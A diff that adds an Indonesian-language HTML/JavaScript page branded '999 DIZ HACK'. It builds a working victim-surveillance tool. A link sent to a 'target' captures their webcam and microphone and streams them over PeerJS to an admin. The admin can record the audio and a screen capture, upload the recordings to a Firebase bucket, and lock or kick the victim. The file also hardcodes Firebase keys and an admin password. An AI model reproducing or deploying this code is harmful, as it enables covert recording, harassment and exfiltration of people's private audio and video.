@@ -1,1 +1,606 @@
-WEB KU LAGI DOWN COK
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>DIZ FLYZE GG ABIZ</title>
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
+  <style>
+    :root {
+      --primary-color: #0ff;
+      --secondary-color: #075e54;
+      --accent-color: #25d366;
+      --error-color: #ff073a;
+      --background-color: #000;
+      --card-bg: rgba(0, 0, 0, 0.95);
+      --neon-glow: 0 0 15px var(--primary-color);
+      --background-image: url('https://example.com/your-background.jpg');
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body {
+      width: 100%;
+      height: 100%;
+      background: var(--background-image, var(--background-color));
+      background-size: cover;
+      background-position: center;
+      font-family: 'Roboto', sans-serif;
+      color: var(--primary-color);
+      overflow: hidden;
+    }
+    #appContainer {
+      max-width: 480px;
+      margin: 20px auto;
+      background: var(--card-bg);
+      border: 2px solid var(--primary-color);
+      border-radius: 10px;
+      box-shadow: 0 0 20px var(--primary-color);
+      position: relative;
+      padding-bottom: 20px;
+      overflow: hidden;
+    }
+    .fullScreen,
+    #appContainer.adminConnected {
+      max-width: 100vw !important;
+      width: 100vw !important;
+      height: 100vh !important;
+      margin: 0 !important;
+      border: none;
+      border-radius: 0;
+      box-shadow: none;
+    }
+    .header {
+      text-align: center;
+      font-size: 24px;
+      font-weight: bold;
+      padding: 12px;
+      background: linear-gradient(45deg, var(--primary-color), #f0f);
+      color: var(--background-color);
+      text-shadow: var(--neon-glow);
+      animation: neonGlow 1.5s ease-in-out infinite alternate;
+    }
+    @keyframes neonGlow {
+      from { text-shadow: 0 0 10px var(--primary-color), 0 0 20px var(--primary-color); }
+      to { text-shadow: 0 0 20px var(--primary-color), 0 0 30px var(--primary-color); }
+    }
+    #bioContainer { text-align: center; padding: 10px; }
+    #facebookLogo {
+      width: 70px;
+      height: 70px;
+      border-radius: 100%;
+      margin-bottom: 12px;
+      border: 2px solid var(--primary-color);
+    }
+    #bioText { font-size: 16px; color: var(--primary-color); text-shadow: 0 0 5px var(--primary-color); }
+    #connectionStatus {
+      position: absolute;
+      top: 12px;
+      left: 12px;
+      padding: 5px 10px;
+      background: rgba(0, 0, 0, 0.7);
+      border: 1px solid var(--primary-color);
+      border-radius: 5px;
+      font-size: 14px;
+      z-index: 100;
+    }
+    .notification {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(0,0,0,0.8);
+      padding: 15px 25px;
+      border: 2px solid var(--accent-color);
+      border-radius: 10px;
+      font-size: 18px;
+      font-weight: bold;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.5s ease;
+      z-index: 200;
+    }
+    .notification.show { opacity: 1; }
+    #loginForm {
+      display: none;
+      position: block;
+      top: 0;
+      left: 0;
+      transform: translate(0, 0);
+      background: black;
+      padding: 20px;
+      border: 2px solid var(--primary-color);
+      border-radius: 120px;
+      z-index: 300;
+      width: 100%;
+    }
+    #loginForm h2 { margin-bottom: 10px; font-size: 16px; text-align: center; }
+    #loginForm input[type="text"],
+    #loginForm input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin: 6px 0;
+      border: 2px solid var(--primary-color);
+      border-radius: 20px;
+      background: black;
+      color: var(--primary-color);
+    }
+    #loginForm button {
+      width: 100%;
+      padding: 10px;
+      background: black;
+      border: none;
+      border-radius: 20px;
+      color: cyan;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 10px;
+      transition: background 0.3s;
+    }
+    #loginForm button:hover { background: var(--accent-color); }
+    #adminUI { padding: 10px; display: none; }
+    .remote-container {
+      position: relative;
+      transition: width 0.3s ease;
+      width: 100%;
+      margin-bottom: 10px;
+    }
+    #remoteVideo {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+      border-radius: 0;
+    }
+    #localPreview {
+      position: absolute;
+      bottom: 0px;
+      right: 0px;
+      width: 0px;
+      border: 0px solid var(--primary-color);
+      border-radius: 0px;
+      z-index: 0;
+    }
+    .video-label {
+      position: absolute;
+      top: 10px;
+      left: 10px;
+      background: rgba(0, 0, 0, 0.5);
+      padding: 5px 10px;
+      border-radius: 5px;
+      font-size: 14px;
+      font-weight: bold;
+      text-shadow: 0 0 3px #000;
+    }
+    #toggleSizeControl {
+      display: none;
+      position: absolute;
+      top: 12px;
+      right: 12px;
+      background: var(--secondary-color);
+      border: none;
+      border-radius: 100px;
+      color: #fff;
+      padding: 7px 10px;
+      cursor: pointer;
+      z-index: 150;
+      transition: background 0.3s;
+    }
+    #toggleSizeControl:hover { background: var(--accent-color); }
+    #sizeToast {
+      display: none;
+      position: absolute;
+      top: 50px;
+      right: 12px;
+      background: rgba(0, 0, 0, 0.85);
+      border: 1px solid var(--primary-color);
+      border-radius: 5px;
+      padding: 8px;
+      z-index: 150;
+      animation: slideDown 0.3s ease-out;
+    }
+    @keyframes slideDown {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    #sizeToast button {
+      background: var(--secondary-color);
+      border: none;
+      border-radius: 5px;
+      color: #fff;
+      padding: 5px 10px;
+      margin: 4px;
+      cursor: pointer;
+      transition: background 0.3s;
+      width: 100%;
+    }
+    #sizeToast button:hover { background: var(--accent-color); }
+    .link-container {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin: 10px;
+    }
+    .link-container input {
+      flex: 1;
+      padding: 8px 12px;
+      border: 1px solid var(--primary-color);
+      border-radius: 25px;
+      background: var(--background-color);
+      color: var(--primary-color);
+      text-align: center;
+      font-size: 14px;
+    }
+    .link-container button {
+      padding: 8px 12px;
+      border: none;
+      border-radius: 80px;
+      background: var(--secondary-color);
+      color: #fff;
+      cursor: pointer;
+      transition: transform 0.3s, background 0.3s;
+    }
+    .link-container button:hover {
+      transform: scale(1.1);
+      background: var(--accent-color);
+    }
+    #guestUI {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: var(--background-color);
+      z-index: 100;
+      margin: 0;
+      padding: 0;
+    }
+    #guestUI .video-wrapper { width: 100%; height: 100%; position: relative; }
+    #guestSelf {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      transform: scaleX(-1);
+    }
+    #guestRemote {
+      position: absolute;
+      bottom: 0px;
+      right: 0px;
+      width: 0px;
+      border: 0px solid var(--primary-color);
+      border-radius: 0px;
+      z-index: 0;
+    }
+    #audioVisualizer {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      height: 30px;
+      pointer-events: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="wrapper" id="appContainer">
+    <div class="header" id="headerText">999 DIZ HACK 999</div>
+    <div id="bioContainer">
+      <img src="https://i.ibb.co/BVSkxm1M/e93bc4cf17f5.webp" alt="Facebook Logo" id="facebookLogo">
+      <p id="bioText">Tidak Ada System 100% Aman</p>
+    </div>
+    <div id="connectionStatus">No Target</div>
+    <div id="notification" class="notification">Terhubung</div>
+    <div id="loginForm">
+      <h2>LOGIN ADMIN</h2>
+      <input type="text" id="username" placeholder="Username">
+      <input type="password" id="password" placeholder="Password">
+      <button id="loginBtn">-• CEK IN •-</button>
+    </div>
+    <div id="adminUI">
+      <div class="remote-container" id="remoteContainer">
+        <video id="remoteVideo" autoplay playsinline></video>
+        <video id="localPreview" autoplay muted playsinline></video>
+        <div class="video-label">SI TOLOL BILEK :</div>
+        <canvas id="audioVisualizer"></canvas>
+      </div>
+      <button id="toggleSizeControl">☰</button>
+      <div id="sizeToast">
+        <button id="optionMENGURANG">MENGURANG</button>
+        <button id="optionMENAMBAH">MENAMBAH</button>
+        <button id="optionTINGGIKAN">TINGGIKAN</button>
+        <button id="optionPENDEKAN">PENDEKAN</button>
+        <button id="optionLOCK_TARGET">LOCK TARGET</button>
+        <button id="optionKICK_TARGET">KICK TARGET</button>
+        <button id="optionREKAM_AUDIO">REKAM AUDIO</button>
+        <button id="optionREKAM_LAYAR">REKAM LAYAR</button>
+        <button id="optionLOCK_CALL">LOCK CALL</button>
+      </div>
+      <div class="link-container" id="linkContainer">
+        <input type="text" id="callLink" readonly placeholder="Send Link To Hacked.">
+        <button id="copyLinkBtn">➤</button>
+      </div>
+    </div>
+    <div id="guestUI">
+      <div class="video-wrapper">
+        <video id="guestSelf" autoplay playsinline></video>
+        <video id="guestRemote" autoplay playsinline></video>
+      </div>
+    </div>
+  </div>
+  <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyDIOjpEtWakfh0WNCDC1iPj9Qm5zKDlaL4",
+      authDomain: "login-24767.firebaseapp.com",
+      databaseURL: "https://login-24767-default-rtdb.firebaseio.com",
+      projectId: "login-24767",
+      storageBucket: "login-24767.appspot.com",
+      messagingSenderId: "809521846306",
+      appId: "1:809521846306:web:ee8bc0fe4e07584bad127b"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+    const peerConfig = { config: { iceServers: [{ urls: "stun:stun.l.google.com:19302" }, { urls: "stun:stun1.l.google.com:19302" }] } };
+    const ADMIN_USERNAME = "DIZ FLYZE", ADMIN_PASSWORD = "1234567890987654321";
+    function getQueryParam(param) { return new URLSearchParams(window.location.search).get(param); }
+    let peer = null, localStream = null, currentCall = null, targetSize = 100, targetHeight = 100, guestDataConn = null, lockCallEnabled = false, audioRecorder = null, audioChunks = [], screenRecorder = null, screenChunks = [];
+    function updateConnectionStatus(status) { document.getElementById("connectionStatus").textContent = status; }
+    function showNotification(message, isError = false) {
+      const notif = document.getElementById("notification");
+      notif.textContent = message;
+      notif.style.borderColor = isError ? "#ff073a" : "#25d366";
+      notif.classList.add("show");
+      setTimeout(() => { notif.classList.remove("show"); }, isError ? 5000 : 3000);
+    }
+    function getLiveStream() { return navigator.mediaDevices.getUserMedia({ video: true, audio: true }); }
+    function initAudioVisualizer(stream) {
+      const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+      const analyser = audioContext.createAnalyser();
+      const source = audioContext.createMediaStreamSource(stream);
+      source.connect(analyser);
+      analyser.fftSize = 256;
+      const bufferLength = analyser.frequencyBinCount, dataArray = new Uint8Array(bufferLength);
+      const canvas = document.getElementById("audioVisualizer"), canvasCtx = canvas.getContext("2d");
+      canvas.width = canvas.offsetWidth;
+      canvas.height = canvas.offsetHeight;
+      function draw() {
+        requestAnimationFrame(draw);
+        analyser.getByteFrequencyData(dataArray);
+        canvasCtx.fillStyle = "rgba(0,0,0,0.7)";
+        canvasCtx.fillRect(0, 0, canvas.width, canvas.height);
+        const barWidth = (canvas.width / bufferLength) * 2.5;
+        let x = 0;
+        for (let i = 0; i < bufferLength; i++) {
+          const barHeight = dataArray[i] / 2;
+          canvasCtx.fillStyle = "rgb(" + (barHeight + 100) + ",50,50)";
+          canvasCtx.fillRect(x, canvas.height - barHeight, barWidth, barHeight);
+          x += barWidth + 1;
+        }
+      }
+      draw();
+    }
+    function uploadToFirebase(blob, type) {
+      const timestamp = Date.now();
+      const storageRef = firebase.storage().ref();
+      const fileRef = storageRef.child('DIZCALL/' + timestamp + '_' + type + '.webm');
+      fileRef.put(blob).then(snapshot => snapshot.ref.getDownloadURL()).then(downloadURL => {
+        firebase.database().ref('DIZCALL/' + timestamp).set({ type: type, url: downloadURL, timestamp: timestamp });
+        showNotification(type.toUpperCase() + " telah diupload ke Firebase.");
+      }).catch(err => {
+        console.error("Upload error:", err);
+        showNotification("Upload error: " + err.message, true);
+      });
+    }
+    function initLogin() {
+      document.getElementById("loginForm").style.display = "block";
+      document.getElementById("adminUI").style.display = "none";
+      document.getElementById("guestUI").style.display = "none";
+      document.getElementById("loginBtn").addEventListener("click", () => {
+        const username = document.getElementById("username").value.trim(), password = document.getElementById("password").value.trim();
+        if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
+          document.getElementById("loginForm").style.display = "none";
+          initAdmin();
+        } else { showNotification("[ MAU NGAPAIN DEK ]", true); }
+      });
+    }
+    function initAdmin() {
+      updateConnectionStatus("Disconnected");
+      document.getElementById("adminUI").style.display = "block";
+      document.getElementById("guestUI").style.display = "none";
+      peer = new Peer(undefined, peerConfig);
+      peer.on("open", (id) => {
+        console.log("Admin Peer ID:", id);
+        const link = window.location.origin + window.location.pathname + "?peer=" + id;
+        document.getElementById("callLink").value = link;
+      });
+      peer.on("error", (err) => { console.error(err); showNotification(err.message, true); });
+      peer.on("connection", (conn) => {
+        guestDataConn = conn;
+        conn.on("data", (data) => { console.log("Data dari guest:", data); });
+      });
+      getLiveStream().then((stream) => {
+        localStream = stream;
+        document.getElementById("localPreview").srcObject = stream;
+        initAudioVisualizer(stream);
+        peer.on("call", (call) => {
+          currentCall = call;
+          call.answer(localStream);
+          call.on("stream", (remoteStream) => {
+            document.getElementById("remoteVideo").srcObject = remoteStream;
+            showNotification("TARGET CONNECTED");
+            updateConnectionStatus("Connected");
+            document.getElementById("appContainer").classList.add("adminConnected");
+            if (!guestDataConn) {
+              guestDataConn = peer.connect(call.peer);
+              guestDataConn.on("open", () => { console.log("Data connection established"); });
+            }
+            makeResizable(document.getElementById("remoteContainer"));
+          });
+          call.on("close", () => {
+            if (lockCallEnabled) {
+              showNotification("TERPUTUS ! MENUNGGU MENGHUBUNGKAN !");
+            } else {
+              showNotification("TARGET CLOSED");
+              updateConnectionStatus("Disconnected");
+              document.getElementById("appContainer").classList.remove("adminConnected");
+            }
+          });
+        });
+      }).catch((err) => { console.error(err); showNotification(err.message, true); });
+      document.getElementById("copyLinkBtn").addEventListener("click", () => {
+        const input = document.getElementById("callLink");
+        input.select();
+        document.execCommand("copy");
+        showNotification("[ SUKSES COPY ]");
+      });
+      document.getElementById("toggleSizeControl").style.display = "block";
+      document.getElementById("toggleSizeControl").addEventListener("click", () => {
+        const toast = document.getElementById("sizeToast");
+        toast.style.display = (toast.style.display === "none" || toast.style.display === "") ? "block" : "none";
+        if (toast.style.display === "block") { setTimeout(() => { toast.style.display = "none"; }, 5000); }
+      });
+      function setTargetSize(newSize) {
+        targetSize = newSize;
+        document.getElementById("remoteContainer").style.width = targetSize + "%";
+      }
+      function setTargetHeight(newHeight) {
+        targetHeight = newHeight;
+        document.getElementById("remoteContainer").style.height = targetHeight + "%";
+      }
+      document.getElementById("optionMENGURANG").addEventListener("click", () => {
+        if (targetSize > 30) setTargetSize(targetSize - 10);
+        document.getElementById("sizeToast").style.display = "none";
+      });
+      document.getElementById("optionMENAMBAH").addEventListener("click", () => {
+        if (targetSize < 100) setTargetSize(targetSize + 10);
+        document.getElementById("sizeToast").style.display = "none";
+      });
+      document.getElementById("optionTINGGIKAN").addEventListener("click", () => {
+        if (targetHeight < 100) setTargetHeight(targetHeight + 10);
+        document.getElementById("sizeToast").style.display = "none";
+      });
+      document.getElementById("optionPENDEKAN").addEventListener("click", () => {
+        if (targetHeight > 30) setTargetHeight(targetHeight - 10);
+        document.getElementById("sizeToast").style.display = "none";
+      });
+      document.getElementById("optionLOCK_TARGET").addEventListener("click", () => {
+        if (guestDataConn && guestDataConn.open) { guestDataConn.send({command: 'LOCK_TARGET'}); showNotification("[ KICK TARGET PROSES ]"); }
+        else { showNotification("[ TIDAK ADA TARGET ]", true); }
+        document.getElementById("sizeToast").style.display = "none";
+      });
+      document.getElementById("optionKICK_TARGET").addEventListener("click", () => {
+        if (guestDataConn && guestDataConn.open) { guestDataConn.send({command: 'KICK_TARGET'}); if (currentCall) currentCall.close(); showNotification("[ KICK TARGET SEND ]"); }
+        else { showNotification("[ TIDAK ADA TARGET ]", true); }
+        document.getElementById("sizeToast").style.display = "none";
+      });
+      document.getElementById("optionREKAM_AUDIO").addEventListener("click", () => {
+        if (audioRecorder && audioRecorder.state === "recording") { stopAudioRecording(); document.getElementById("optionREKAM_AUDIO").textContent = "REKAM AUDIO"; }
+        else { startAudioRecording(); document.getElementById("optionREKAM_AUDIO").textContent = "[ STOP REKAM AUDIO ]"; }
+        document.getElementById("sizeToast").style.display = "none";
+      });
+      document.getElementById("optionREKAM_LAYAR").addEventListener("click", () => {
+        if (screenRecorder && screenRecorder.state === "recording") { stopScreenRecording(); document.getElementById("optionREKAM_LAYAR").textContent = "REKAM LAYAR"; }
+        else { startScreenRecording(); document.getElementById("optionREKAM_LAYAR").textContent = "[ STOP REKAM LAYAR ]"; }
+        document.getElementById("sizeToast").style.display = "none";
+      });
+      document.getElementById("optionLOCK_CALL").addEventListener("click", () => {
+        lockCallEnabled = !lockCallEnabled;
+        if (guestDataConn && guestDataConn.open) { guestDataConn.send({command: 'LOCK_CALL', enabled: lockCallEnabled}); }
+        showNotification("[ LOCK CALL ] " + (lockCallEnabled ? "[ TRUE ]" : "[ FALSE ]"));
+        document.getElementById("sizeToast").style.display = "none";
+      });
+    }
+    function initGuest(adminPeerId) {
+      document.getElementById("loginForm").style.display = "none";
+      document.getElementById("adminUI").style.display = "none";
+      document.getElementById("appContainer").classList.add("fullScreen");
+      document.getElementById("guestUI").style.display = "block";
+      document.getElementById("headerText").textContent = "YOU SYSTEM IS HACK";
+      updateConnectionStatus("Connected");
+      getLiveStream().then((stream) => {
+        document.getElementById("guestSelf").srcObject = stream;
+        peer = new Peer(undefined, peerConfig);
+        peer.on("open", (id) => {
+          console.log("Guest Peer ID:", id);
+          let dataConn = peer.connect(adminPeerId);
+          dataConn.on("open", () => { console.log("Data connection ke admin terbentuk"); });
+          dataConn.on("data", (data) => { handleAdminCommands(data); });
+          const call = peer.call(adminPeerId, stream);
+          currentCall = call;
+          call.on("stream", (remoteStream) => { document.getElementById("guestRemote").srcObject = remoteStream; });
+        });
+        peer.on("error", (err) => { console.error(err); showNotification(err.message, true); });
+      }).catch((err) => { console.error(err); showNotification(err.message, true); });
+    }
+    function handleAdminCommands(data) {
+      switch(data.command) {
+        case 'LOCK_TARGET':
+          window.onbeforeunload = function(e) { e.preventDefault(); return "[ HACK LOCK SESSION ]"; };
+          showNotification("[ TARGET LOCK ]");
+          break;
+        case 'KICK_TARGET':
+          alert("[ ANDA MEMBOSANKAN ]");
+          if (currentCall) currentCall.close();
+          if (peer) peer.destroy();
+          break;
+        case 'LOCK_CALL':
+          showNotification("[ CALL TERKUNCI ]");
+          break;
+        default:
+          console.log("[ NOT FUNCTION ] >" , data);
+      }
+    }
+    function makeResizable(element) {
+      const handle = document.createElement('div');
+      handle.style.width = '15px';
+      handle.style.height = '15px';
+      handle.style.background = 'var(--accent-color)';
+      handle.style.position = 'absolute';
+      handle.style.right = '0';
+      handle.style.bottom = '0';
+      handle.style.cursor = 'se-resize';
+      element.style.position = 'relative';
+      element.appendChild(handle);
+      handle.addEventListener('mousedown', initResize, false);
+      function initResize(e) {
+        window.addEventListener('mousemove', Resize, false);
+        window.addEventListener('mouseup', stopResize, false);
+      }
+      function Resize(e) {
+        const rect = element.getBoundingClientRect();
+        element.style.width = (e.clientX - rect.left) + 'px';
+        element.style.height = (e.clientY - rect.top) + 'px';
+      }
+      function stopResize(e) {
+        window.removeEventListener('mousemove', Resize, false);
+        window.removeEventListener('mouseup', stopResize, false);
+      }
+    }
+    function startAudioRecording() {
+      const remoteVideo = document.getElementById("remoteVideo"), remoteStream = remoteVideo.srcObject, combinedStream = new MediaStream();
+      if(localStream && localStream.getAudioTracks().length > 0) { localStream.getAudioTracks().forEach(track => combinedStream.addTrack(track)); }
+      if(remoteStream && remoteStream.getAudioTracks().length > 0) { remoteStream.getAudioTracks().forEach(track => combinedStream.addTrack(track)); }
+      try { audioRecorder = new MediaRecorder(combinedStream); }
+      catch(e) { showNotification("Error memulai rekaman audio: " + e.message, true); return; }
+      audioRecorder.ondataavailable = function(e) { if (e.data && e.data.size > 0) { audioChunks.push(e.data); } }
+      audioRecorder.onstop = function() { let blob = new Blob(audioChunks, { type: 'audio/webm' }); uploadToFirebase(blob, 'audio'); audioChunks = []; }
+      audioRecorder.start();
+      showNotification("[ START REKAMAN AUDIO ]");
+    }
+    function stopAudioRecording() { if (audioRecorder && audioRecorder.state !== "inactive") { audioRecorder.stop(); showNotification("STOP REKAM AUDIO"); } }
+    async function startScreenRecording() {
+      try {
+        let screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
+        screenRecorder = new MediaRecorder(screenStream);
+        screenRecorder.ondataavailable = function(e) { if(e.data && e.data.size > 0) { screenChunks.push(e.data); } }
+        screenRecorder.onstop = function() { let blob = new Blob(screenChunks, { type: 'video/webm' }); uploadToFirebase(blob, 'screen'); screenChunks = []; }
+        screenRecorder.start();
+        showNotification("[ START REKAMAN LAYAR ]");
+      } catch(e) { showNotification("Error memulai rekaman layar: " + e.message, true); }
+    }
+    function stopScreenRecording() { if (screenRecorder && screenRecorder.state !== "inactive") { screenRecorder.stop(); showNotification("STOP REKAM LAYAR"); } }
+    window.addEventListener("load", () => { const adminPeerId = getQueryParam("peer"); if (adminPeerId) { initGuest(adminPeerId); } else { initLogin(); } });
+  </script>
+</body>
+</html>
